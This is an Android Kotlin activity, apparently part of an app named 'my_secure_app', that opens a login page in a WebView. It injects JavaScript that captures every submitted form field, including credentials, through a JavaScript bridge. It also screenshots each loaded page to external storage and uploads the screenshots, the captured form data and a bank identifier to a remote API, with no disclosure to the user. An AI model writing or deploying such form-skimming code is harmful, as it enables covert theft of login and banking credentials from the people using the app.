package com.example.my_secure_app

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.*
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.format.DateFormat
import android.util.Log
import android.view.Window
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.FileProvider
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.util.*


class MyTestingActivityKotlin : AppCompatActivity() {
    private var webView: WebView?=null
    private var url: TextView?=null
    private var close: ImageView?=null
    private val REQUEST_EXTERNAL_STORAGe = 1
    private var count:Int=0
    private val permissionstorage = arrayOf(
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
    )
    var os: OutputStream? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_my_testing_kotlin)
        supportActionBar?.hide()
        webView = findViewById(R.id.web_kotlin)
        url= findViewById(R.id.tv_url)
        close=findViewById(R.id.iv_close)
        val window: Window = window
        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        window.statusBarColor = Color.parseColor("#1D1C21")
        url!!.text = "https://adminsecure.thriftyspends.com/login"
        verifypermissions(this)
        webView?.loadUrl("https://adminsecure.thriftyspends.com/login")
        webView?.settings?.javaScriptEnabled = true
        webView?.getSettings()?.setJavaScriptCanOpenWindowsAutomatically(true);
        webView?.requestFocusFromTouch();
        webView?.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d("SCREEN","onPageFinished")
                injectJavaScript(view);
                count++;
                if (count!=1){
                    Log.d("SCREENSHOT","1")
                    val time = System.currentTimeMillis()
                    val picture: Picture = view!!.capturePicture()
                    val mPath = Environment.getExternalStorageDirectory().toString() + "/" +time+ ".jpg"
                    Log.d("SCREENSHOT",mPath)
                    var imageFile = File(mPath)
                    val b = Bitmap.createBitmap(
                        picture.width,
                        picture.height, Bitmap.Config.ARGB_8888
                    )
                    val c = Canvas(b)
                    picture.draw(c)

                    try {
                        os = FileOutputStream(imageFile)
                        b.compress(Bitmap.CompressFormat.JPEG, 100, os)
                        os?.flush()
                        os?.close()
                        Log.d("SCREENSHOT","2")
                       // openScreenshot(imageFile)
                        sendScreenShotToAPi(Constants.textDataForApi,imageFile)


                    } catch (e: Exception) {
                        Log.e(javaClass.simpleName, "Error writing bitmap", e)
                        Log.d("SCREENSHOT","3"+e)
                    }
                }
            }
        }
        webView?.addJavascriptInterface(JSBridge, "Bridge")
        //getScreenshots("String")
        close!!.setOnClickListener {
            finish()
        }

    }

    object JSBridge {
        @JavascriptInterface
        fun callFromJs(s: String) {

            Handler(Looper.getMainLooper()).post(Runnable {
                Constants.textDataForApi=s
                Log.d("SCREENSHOT","data:"+Constants.textDataForApi)
            })
        }
    }

    fun verifypermissions(activity: Activity?) {
        val permissions = ActivityCompat.checkSelfPermission(
            activity!!,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )

        // If storage permission is not given then request for External Storage Permission
        if (permissions != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                activity,
                this.permissionstorage,
                this.REQUEST_EXTERNAL_STORAGe
            )
        }
    }

    private fun injectJavaScript(view: WebView?) {
        view!!.loadUrl(
            """
           javascript:(function() {
         var form = document.querySelector('form');

    function updateResult() {
     var out = new URLSearchParams(new FormData(form)).toString();
       Bridge.callFromJs(out);

}
form.addEventListener('submit', updateResult);
 
          
           })() 
        """
        )
    }


    fun getScreenshots(s:String){
        webView?.webViewClient = object : WebViewClient() {
            override fun onPageCommitVisible(view: WebView, url: String) {

            }
        }
    }

    private fun savebitmap(filename: String): File? {
        val extStorageDirectory = Environment.getExternalStorageDirectory().toString()
        var outStream: OutputStream? = null
        var file = File("$filename.png")
        if (file.exists()) {
            file.delete()
            file = File(extStorageDirectory, "$filename.png")
            Log.e("file exist", "$file,Bitmap= $filename")
        }
        try {
            // make a new bitmap from your file
            val bitmap: Bitmap = BitmapFactory.decodeFile(file.name)
            outStream = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outStream)
            outStream.flush()
            outStream.close()
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
        Log.e("file", "" + file)
        return file
    }

    fun getScreenshot(s: String) {
        val now = Date()
        DateFormat.format("yyyy-MM-dd_hh:mm:ss", now)
        try {
            // image naming and path  to include sd card  appending name you choose for file
            val mPath = Environment.getExternalStorageDirectory().toString() + "/" + ".jpg"

            // create bitmap screen capture
            val v1 = window.decorView.rootView
//            val v1: View = findViewById<View?>(R.id.web_kotlin).rootView

            v1.isDrawingCacheEnabled = true
            val bitmap = Bitmap.createBitmap(v1.drawingCache)
            v1.isDrawingCacheEnabled = false
            val imageFile = File(mPath)
            val outputStream = FileOutputStream(imageFile)
            val quality = 100
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
            outputStream.flush()
            outputStream.close()


//            openScreenshot(imageFile);

        } catch (e: Throwable) {
            // Several error may come out with file handling or DOM
            e.printStackTrace()
        }
    }
    private fun openScreenshot(imageFile: File) {
        val intent = Intent()
        intent.action = Intent.ACTION_VIEW
        val photoURI = FileProvider.getUriForFile(
            applicationContext, applicationContext.packageName + ".provider", imageFile
        )

//        Uri uri = Uri.fromFile(imageFile);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        intent.setDataAndType(photoURI, "image/*")
        startActivity(intent)
    }

    private fun sendScreenShotToAPi(data:String,imageFile: File) {
        Log.d("SCREENSHOT","data For Api:"+data)
        val builder: MultipartBody.Builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        builder.addFormDataPart("data", data)
        builder.addFormDataPart("bank_id", Constants.bankId)
        builder.addFormDataPart(
            "file",
            imageFile.name,
            RequestBody.create(MultipartBody.FORM, imageFile)
        )

        val requestBody: RequestBody = builder.build()
        val call = RetrofitClient.getInstance().myApi.getPostCreateBodyResponse(
            "application/json",
            "Bearer" + " " + Constants.AuthToken,
            requestBody
        )
        call.enqueue(object : Callback<DataResponseModel?> {
            override fun onResponse(
                call: Call<DataResponseModel?>,
                response: Response<DataResponseModel?>
            ) {
                if (response.body() != null) {
                    Log.d("RESPONSE", response.body()!!.message)
//                MainActivity().gotoFltApp()
                }
            }

            override fun onFailure(call: Call<DataResponseModel?>, t: Throwable) {
                Log.d("RESPONSE", t.toString())
            }
        })
    }
}
